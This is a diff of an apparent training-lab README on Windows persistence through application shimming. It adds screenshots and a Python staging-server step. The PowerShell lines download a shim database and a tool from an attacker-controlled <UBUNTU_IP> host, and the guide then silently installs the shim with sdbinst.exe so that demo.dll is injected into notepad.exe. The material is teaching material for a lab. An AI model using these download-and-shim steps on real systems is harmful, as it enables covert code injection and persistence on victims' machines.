@@ -73,13 +73,16 @@ As the attacker, your tools are pre-staged on the Ubuntu server. You simply need
 
 - Open an Ubuntu Shell terminal:
 
+<img width="388" height="489" alt="image" src="https://github.com/user-attachments/assets/4f75c43c-43ee-49f0-b23d-08eb146ab986" />
+
+- In the **Lab Directory**, start a *python server* : 
+
 ```bash
 cd ~/BnB/SdbExplorer
-ls -lh
-ip a
 python3 -m http.server 8001
 ```
 
+<img width="607" height="167" alt="image" src="https://github.com/user-attachments/assets/d4a7fdaf-2617-4397-8adf-5a3ecb917bf1" />
 
 >[!NOTE]
 >Note down your <UBUNTU_IP> — you will need it in the next phase.
@@ -92,9 +95,11 @@ The Lab Directory contains three pre-staged files:
 
 * sdb-explorer.exe — the forensic analysis tool.
 
+<img width="628" height="162" alt="image" src="https://github.com/user-attachments/assets/79acf40a-b082-41ce-a299-ca605a76855a" />
+
 ### Phase 3: Payload Delivery & Shim Installation (Windows)
 
-- Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.
+Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.
 
 - Download all three files. Replace <UBUNTU_IP> with your actual Ubuntu IP address:
 
@@ -109,6 +114,12 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\p
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
 ```
 
+<img width="1492" height="65" alt="image" src="https://github.com/user-attachments/assets/088eb0b7-26ee-42af-b902-c31fbbe048ca" />
+
+- In the server terminal, three *GET* requests should be visible now: 
+
+<img width="649" height="156" alt="image" src="https://github.com/user-attachments/assets/16763bc5-e763-42d8-904f-830f4f860f4e" />
+
 - Now, install the Shim Database using sdbinst.exe — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:
 
 ```powershell
@@ -116,6 +127,8 @@ sdbinst.exe "$env:TEMP\patch.sdb"
 ```
 
 You will see a brief confirmation message. Quietly and without any visible indication to regular users, the OS has now been instructed to **inject demo.dll** into every future instance of the 32-bit notepad.exe.
+
+<img width="898" height="100" alt="image" src="https://github.com/user-attachments/assets/ea0634fc-0046-409a-88c6-ed9631e4402b" />
 
 ### Phase 4: Triggering the Persistence
 
